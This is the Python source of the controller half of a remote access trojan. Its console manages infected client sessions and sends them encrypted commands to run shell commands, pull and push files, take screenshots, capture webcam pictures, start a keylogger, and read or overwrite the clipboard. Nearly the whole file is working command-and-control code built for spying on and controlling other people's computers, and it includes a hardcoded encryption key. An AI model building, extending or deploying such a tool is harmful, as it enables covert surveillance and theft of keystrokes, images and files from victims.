# standard python libraries
import sys
import base64
import socket
import json
import threading
import os
import argparse
import math
# non-standard libraries
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.exceptions import InvalidTag
import texttable
import cmd2


class Server:
    def __init__(self):
        self.user_interface = UserInterface(self)
        self.connection = Connection(self.user_interface)

    def exit_server(self):
        self.connection.sock.close()

    def list_sessions(self, connections):
        table = texttable.Texttable()
        table.set_cols_width([5, 15, 6, 15, 15])
        rows = [["INDEX", "ADDRESS", "PORT", "TAG", "GROUPS"]]
        for index, session in enumerate(self.connection.sessions):
            if session["connection"] in connections:
                rows.append([index, session["address"], session["port"], session["tag"], ", ".join(session["groups"])])
        table.add_rows(rows)
        self.user_interface.poutput(table.draw())

    def edit_tag(self, tag, connections):
        for index, session in enumerate(self.connection.sessions):
            if session["connection"] in connections:
                self.connection.sessions[index]["tag"] = tag

    def close_session(self, connections):
        request = {"cmd": "r",
                   "timeout": self.user_interface.cmd_timeout}
        for session in list(self.connection.sessions):
            if session["connection"] in connections:
                try:
                    self.connection.send(request, session["connection"])
                except socket.error:
                    pass
                session["connection"].close()
                self.connection.sessions.remove(session)

    def edit_group(self, connections_to_add, connections_to_remove, group_names):
        for index, session in enumerate(self.connection.sessions):
            if session["connection"] in connections_to_remove:
                for name in group_names:
                    if name != "all":  # can't remove client from 'all' group
                        try:
                            self.connection.sessions[index]["groups"].remove(name)
                        except ValueError:
                            pass
            if session["connection"] in connections_to_add:
                for name in group_names:
                    self.connection.sessions[index]["groups"].add(name)

    def execute_command(self, exe, connections):
        request = {"cmd": "c",
                   "exe": exe,
                   "timeout": self.user_interface.cmd_timeout}
        for connection in connections:
            self.connection.send(request, connection)
            valid, response = self.connection.recv(connection, {"error": str, "data": str})
            if valid:
                if response["error"]:
                    self.user_interface.perror(
                        f"Error from session {self.connection.get_index_by_connection(connection)}: {response['error']}")
                elif response["data"]:
                    self.user_interface.poutput(response["data"])

    def download_file(self, path_to_open, path_to_save, connections):
        request = {"cmd": "d",
                   "open_path": path_to_open}
        for connection in connections:
            self.connection.send(request, connection)
            valid, response = self.connection.recv(connection, {"error": str, "data": str})
            if valid:
                if response["error"]:
                    self.user_interface.perror(
                        f"Error from session {self.connection.get_index_by_connection(connection)}: {response['error']}")
                else:
                    try:
                        with open(path_to_save, "wb") as file:
                            file.write(base64.b64decode(response["data"]))
                    except PermissionError:
                        self.user_interface.perror("PermissionError")

    def upload_file(self, path_to_open, path_to_save, connections):
        request = {"cmd": "u",
                   "save_path": path_to_save,
                   "data": bytes()}
        try:
            with open(path_to_open, "rb") as file:
                request["data"] = base64.b64encode(file.read()).decode(self.connection.CODEC)
        except FileNotFoundError:
            self.user_interface.perror("FileNotFoundError")
        except PermissionError:
            self.user_interface.perror("PermissionError")
        except MemoryError:
            self.user_interface.perror("MemoryError")
        else:
            for connection in connections:
                self.connection.send(request, connection)
                valid, response = self.connection.recv(connection, {"error": str})
                if valid:
                    if response["error"]:
                        self.user_interface.perror(
                            f"Error from session {self.connection.get_index_by_connection(connection)}: {response['error']}")

    def make_screenshot(self, monitor, path_to_save, connections):
        request = {"cmd": "s",
                   "monitor": monitor,
                   "save_path": path_to_save,
                   "timeout": self.user_interface.cmd_timeout}
        for connection in connections:
            self.connection.send(request, connection)
            valid, response = self.connection.recv(connection, {"error": str})
            if valid:
                if response["error"]:
                    self.user_interface.perror(
                        f"Error from session {self.connection.get_index_by_connection(connection)}: {response['error']}")

    def zip_file_or_folder(self, compression_level, path_to_open, path_to_save, connections):
        request = {"cmd": "z",
                   "comp_lvl": compression_level,
                   "open_path": path_to_open,
                   "save_path": path_to_save,
                   "timeout": self.user_interface.cmd_timeout}
        for connection in connections:
            self.connection.send(request, connection)
            valid, response = self.connection.recv(connection, {"error": str})
            if valid:
                if response["error"]:
                    self.user_interface.perror(
                        f"Error from session {self.connection.get_index_by_connection(connection)}: {response['error']}")

    def capture_camera_picture(self, port, path_to_save, connections):
        request = {"cmd": "w",
                   "cam_port": port,
                   "save_path": path_to_save,
                   "timeout": self.user_interface.cmd_timeout}
        for connection in connections:
            self.connection.send(request, connection)
            valid, response = self.connection.recv(connection, {"error": str})
            if valid:
                if response["error"]:
                    self.user_interface.perror(
                        f"Error from session {self.connection.get_index_by_connection(connection)}: {response['error']}")

    def log_keys(self, action, filename, connections):
        request = {"cmd": "k",
                   "action": action,
                   "save_path": filename}
        for connection in connections:
            self.connection.send(request, connection)
            valid, response = self.connection.recv(connection, {"error": str, "data": str})
            if valid:
                if response["error"]:
                    self.user_interface.perror(
                        f"Error from session {self.connection.get_index_by_connection(connection)}: {response['error']}")
                elif response["data"]:
                    self.user_interface.poutput(response["data"])

    def edit_clipboard(self, content, connections):
        request = {"cmd": "b",
                   "content": content,
                   "timeout": self.user_interface.cmd_timeout}
        for connection in connections:
            self.connection.send(request, connection)
            valid, response = self.connection.recv(connection, {"error": str, "data": str})
            if valid:
                if response["error"]:
                    self.user_interface.perror(
                        f"Error from session {self.connection.get_index_by_connection(connection)}: {response['error']}")
                elif response["data"]:
                    self.user_interface.poutput(response["data"])

    def block_address(self, action, addresses, close_existing):
        if action == "add":
            for address in addresses:
                self.connection.blocked_ips.add(address)
                if close_existing:
                    for session in self.connection.sessions:
                        if session["address"] == address:
                            self.connection.sessions.remove(session)
                            try:
                                session["connection"].close()
                            except socket.error:
                                pass
        elif action == "rm":
            for address in addresses:
                if address in self.connection.blocked_ips:
                    self.connection.blocked_ips.remove(address)
        elif action == "list":
            for address in self.connection.blocked_ips:
                print(address)


class Connection:
    def __init__(self, user_interface):
        self.CODEC = "utf8"
        self.PACKET_SIZE = 1024
        self.sessions = []
        self.blocked_ips = set()
        self.user_interface = user_interface

        HOST = "127.0.0.1"
        PORT = 10001
        KEY = b'\xbch`9\xd6k\xcbT\xed\xa5\xef_\x9d*\xda\xd2sER\xedA\xc0a\x1b)\xcc9\xb2\xe7\x91\xc2A'

        self.crypter = AESGCM(KEY)

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((HOST, PORT))
        self.user_interface.pinfo("server running")
        self.accept_new_connections_process = threading.Thread(target=self.accept_new_connections, args=(self.sock,))
        self.accept_new_connections_process.start()
        self.user_interface.pinfo("waiting for clients")

    def get_conn_fgoi(self, objects):  # get connections from groups and/or indices
        connections = list()
        for goi in objects:
            for index, session in enumerate(self.sessions):
                if session["connection"] not in connections:
                    if goi in session["groups"]:
                        connections.append(session["connection"])
                    elif goi == str(index):
                        connections.append(session["connection"])
        return connections

    def accept_new_connections(self, sock):
        while True:
            try:
                sock.listen()
                connection, (address, port) = sock.accept()
            except OSError:  # occurs when socket is closed
                break
            else:
                if address in self.blocked_ips:
                    connection.close()
                else:
                    self.user_interface.async_alert("[*] client connected")
                    session = {"connection": connection,
                               "address": address,
                               "port": port,
                               "tag": "no tag",
                               "groups": {"all"}}
                    self.sessions.append(session)

    # credit: https://stackoverflow.com/questions/1094841/reusable-library-to-get-human-readable-version-of-file-size
    def format_byte_length(self, num, suffix='B'):
        for unit in ["", "Ki", "Mi", "Gi", "Ti", "Pi", "Ei", "Zi"]:
            if abs(num) < 1024.0:
                return f"{num:3.1f} {unit}{suffix}"
            num /= 1024.0
        return f"{num:3.1f} Yi{suffix}"

    def send(self, data: dict, connection):
        self.sock.settimeout(self.user_interface.sock_timeout)
        data = self.encrypt(json.dumps(data).encode(self.CODEC))
        len_data_total = len(data)
        total_packets = math.ceil(len_data_total / self.PACKET_SIZE)
        try:
            connection.sendall(str(len_data_total).encode("utf8"))
            connection.recv(self.PACKET_SIZE)
            for packet_number in range(total_packets):
                connection.sendall(data[packet_number*self.PACKET_SIZE:(packet_number + 1) * self.PACKET_SIZE])
                sys.stdout.write(f"\r[*] sending {self.format_byte_length(len_data_total)} to {packet_number + 1 / (total_packets / 100)}% complete")
                sys.stdout.flush()
                print()
        except socket.error as error:
            self.user_interface.perror(f"SocketError from session {self.get_index_by_connection(connection)}: {error}")

    def recv(self, connection, expected_dict):
        connection.settimeout(self.user_interface.sock_timeout)
        data = bytearray()
        try:
            header = int(connection.recv(self.PACKET_SIZE).decode("utf8"))
            connection.send("READY".encode("utf8"))
            for _ in range(math.ceil(header / self.PACKET_SIZE)):
                data.extend(connection.recv(self.PACKET_SIZE))
                sys.stdout.write(f"\r[*] receiving {self.format_byte_length(header)} to {round(len(data) / (header / 100), 1)}% complete")
                sys.stdout.flush()
                print()
            received_dict = json.loads(self.decrypt(bytes(data)).decode(self.CODEC))

        # check the received data
            for expected_key, expected_type in zip(expected_dict.keys(), expected_dict.values()):
                if expected_key not in received_dict.keys() or type(received_dict[expected_key]) != expected_type:
                    return False, None
            return True, received_dict
        except socket.error as error:
            self.user_interface.perror(f"SocketError from session {self.get_index_by_connection(connection)}: {error}")
        except InvalidTag:
            self.user_interface.perror(f"InvalidTag from session {self.get_index_by_connection(connection)}")
        except json.decoder.JSONDecodeError:
            self.user_interface.perror(f"JSONDecodeError from session {self.get_index_by_connection(connection)}")
        except UnicodeDecodeError:
            self.user_interface.perror(f"UnicodeDecodeError from session {self.get_index_by_connection(connection)}")
        except ValueError:
            self.user_interface.perror(f"ValueError from session {self.get_index_by_connection(connection)}")
        return False, None

    def encrypt(self, data):
        nonce = os.urandom(12)
        return nonce + self.crypter.encrypt(nonce, data, b"")

    def decrypt(self, cipher):
        return self.crypter.decrypt(cipher[:12], cipher[12:], b"")

    def get_index_by_connection(self, searched_connection):
        for index, session in enumerate(self.sessions):
            if searched_connection == session["connection"]:
                return index


class UserInterface(cmd2.Cmd):
    exit_parser = argparse.ArgumentParser(prog="exit")

    list_parser = argparse.ArgumentParser(prog="list")
    list_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")

    opt_parser = argparse.ArgumentParser(prog="opt")
    opt_parser.add_argument("-o", "--option", required=True, type=str, help="name of the option to edit")
    opt_parser.add_argument("-v", "--value", required=True, type=int, help="value to change the option to")

    tag_parser = argparse.ArgumentParser(prog="tag")
    tag_parser.add_argument("-t", "--tag", required=True, type=str, help="value to change the tag to")
    tag_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")

    close_parser = argparse.ArgumentParser(prog="close")
    close_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")

    group_parser = argparse.ArgumentParser(prog="group")
    mode_group = group_parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument("-a", "--add", nargs="+", help="sessions to add to groups", default=[])
    mode_group.add_argument("-r", "--rm", nargs="+", help="sessions to rm from groups", default=[])
    group_parser.add_argument("-g", "--groups", nargs="+", required=True, help="groups to add/rm the sessions to/from")

    exe_parser = argparse.ArgumentParser(prog="exe")
    exe_parser.add_argument("-e", "--exe", required=True, type=str, help="command to execute")
    exe_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")

    down_parser = argparse.ArgumentParser(prog="down")
    down_parser.add_argument("-r", "--read", required=True, type=str, help="file to read data from")
    down_parser.add_argument("-w", "--write", required=True, type=str, help="file to write data to")
    down_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")

    up_parser = argparse.ArgumentParser(prog="up")
    up_parser.add_argument("-r", "--read", required=True, type=str, help="file to read data from")
    up_parser.add_argument("-w", "--write", required=True, type=str, help="file to write data to")
    up_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")

    screen_parser = argparse.ArgumentParser(prog="screen")
    screen_parser.add_argument("-m", "--monitor", default=-1, type=int, choices=range(-1, 99),
                               help="monitor to capture (-1 for all)")
    screen_parser.add_argument("-w", "--write", required=True, type=str, help="file to write the picture in")
    screen_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")

    zip_parser = argparse.ArgumentParser(prog="zip")
    zip_parser.add_argument("-c", "--compression", default=1, type=int, help="zip compression level",
                            choices=range(0, 9))
    zip_parser.add_argument("-r", "--read", required=True, type=str, help="file or folder to read")
    zip_parser.add_argument("-w", "--write", required=True, type=str, help="file to write the zipfile in")
    zip_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")

    cam_parser = argparse.ArgumentParser(prog="cam")
    cam_parser.add_argument("-p", "--port", required=True, type=int, help="camera port (usually 0)")
    cam_parser.add_argument("-w", "--write", required=True, type=str, help="file to write the image in")
    cam_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")

    log_keys_parser = argparse.ArgumentParser(prog="logger")
    log_keys_parser.add_argument("-a", "--action", required=True, type=str, choices=["start", "stop", "status"])
    log_keys_parser.add_argument("-f", "--file", default="log.txt", type=str, help="file to store logs in")
    log_keys_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")

    log_keys_parser = argparse.ArgumentParser(prog="clip")
    log_keys_parser.add_argument("-c", "--content", default="", type=str, help="content to store to clipboard if provided")
    log_keys_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")

    block_parser = argparse.ArgumentParser(prog="block")
    block_parser.add_argument("-a", "--action", required=True, type=str, choices=["add", "rm", "list"])
    block_parser.add_argument("-i", "--ips", nargs="+", type=str, help="addresses to block")
    block_parser.add_argument("-c", "--close", action="store_true",
                              help="closing sessions from blocked ips which are already established")

    def __init__(self, server):
        super().__init__()
        self.server = server
        self.prompt = "[+] "

        # setting options
        self.cmd_timeout = 15
        self.zip_comp = 1
        self.sock_timeout = 20
        # adding some settings
        self.add_settable(cmd2.Settable("cmd_timeout", int, "clientside timeout before returning from a command",
                                        choices=range(0, 3600)))
        self.add_settable(cmd2.Settable("zip_comp", int, "compression level when creating zip file", choices=range(0, 9)))
        self.add_settable(cmd2.Settable("sock_timeout", int, "serverside timeout for receiving and sending data", choices=range(0, 3600)))
        # delete some builtins
        del cmd2.Cmd.do_py
        del cmd2.Cmd.do_run_pyscript
        del cmd2.Cmd.do_run_script
        del cmd2.Cmd.do_quit
        del cmd2.Cmd.do_shortcuts
        del cmd2.Cmd.do_alias
        del cmd2.Cmd.do_macro

    def poutput(self, msg='', *, end: str = '\n'):
        super().poutput(msg)

    def pinfo(self, msg=''):
        super().poutput(f"[*] {msg}")

    def perror(self, msg='', *, end: str = '\n', apply_style: bool = True):
        super().perror(f"[-] {msg}")

    @cmd2.decorators.with_argparser(list_parser)
    def do_list(self, args):
        """List connected sessions"""
        self.server.list_sessions(self.server.connection.get_conn_fgoi(args.sessions))

    @cmd2.decorators.with_argparser(opt_parser)
    def do_opt(self, args):
        """Edit option value"""
        self.server.set_option(args.option, args.value)

    @cmd2.decorators.with_argparser(exit_parser)
    def do_exit(self, _):
        """Exit server and close socket (not closing sessions)"""
        self.server.exit_server()
        return True

    @cmd2.decorators.with_argparser(tag_parser)
    def do_tag(self, args):
        """Edit sessions tag"""
        self.server.edit_tag(self.server.connection.get_conn_fgoi(args.sessions), args.tag)

    @cmd2.decorators.with_argparser(close_parser)
    def do_close(self, args):
        """Close and remove session"""
        self.server.close_session(self.server.connection.get_conn_fgoi(args.sessions))

    @cmd2.decorators.with_argparser(group_parser)
    def do_group(self, args):
        """Edit sessions groups memberships"""
        self.server.edit_group(self.server.connection.get_conn_fgoi(args.add), self.server.connection.get_conn_fgoi(args.rm), args.groups)

    @cmd2.decorators.with_argparser(exe_parser)
    def do_exe(self, args):
        """Remote execute terminal command"""
        self.server.execute_command(args.exe, self.server.connection.get_conn_fgoi(args.sessions))

    @cmd2.decorators.with_argparser(down_parser)
    def do_down(self, args):
        """Download file from client"""
        self.server.download_file(args.read, args.write, self.server.connection.get_conn_fgoi(args.sessions))

    @cmd2.decorators.with_argparser(up_parser)
    def do_up(self, args):
        """Upload file to client"""
        self.server.upload_file(args.read, args.write, self.server.connection.get_conn_fgoi(args.sessions))

    @cmd2.decorators.with_argparser(screen_parser)
    def do_screen(self, args):
        """Capture screen image"""
        self.server.make_screenshot(args.monitor, args.write, self.server.connection.get_conn_fgoi(args.sessions))

    @cmd2.decorators.with_argparser(zip_parser)
    def do_zip(self, args):
        """Compress to zip archive"""
        self.server.zip_file_or_folder(args.compression_level, args.read, args.write, self.server.connection.get_conn_fgoi(args.sessions))

    @cmd2.decorators.with_argparser(cam_parser)
    def do_cam(self, args):
        """Capture camera image"""
        self.server.capture_camera_picture(args.port, args.write, self.server.connection.get_conn_fgoi(args.sessions))

    @cmd2.decorators.with_argparser(log_keys_parser)
    def do_logger(self, args):
        """Start/Stop keylogger"""
        self.server.log_keys(args.action, args.file, self.server.connection.get_conn_fgoi(args.sessions))

    @cmd2.decorators.with_argparser(log_keys_parser)
    def do_clip(self, args):
        """Get/Set clipboard content"""
        self.server.edit_clipboard(args.content, self.server.connection.get_conn_fgoi(args.sessions))

    @cmd2.decorators.with_argparser(block_parser)
    def do_block(self, args):
        """Block a client by ip"""
        self.server.block_address(args.action, args.ips, args.close)


if __name__ == "__main__":
    server = Server()
    server.user_interface.cmdloop()
